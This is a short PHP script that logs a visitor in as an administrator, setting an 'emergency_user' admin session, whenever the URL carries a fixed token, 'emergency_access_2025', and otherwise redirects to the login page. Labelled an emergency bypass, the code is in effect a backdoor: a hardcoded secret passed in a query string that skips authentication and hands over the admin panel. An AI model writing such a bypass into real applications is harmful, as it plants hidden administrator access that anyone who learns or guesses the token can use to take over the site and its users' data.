<?php
session_start();

// Emergency bypass with security token
$valid_token = 'emergency_access_2025';
$token = $_GET['token'] ?? '';

if ($token === $valid_token) {
    $_SESSION['admin_logged_in'] = true;
    $_SESSION['admin_username'] = 'emergency_user';
    header('Location: admin.php');
    exit;
} else {
    header('Location: login.php');
    exit;
}
?>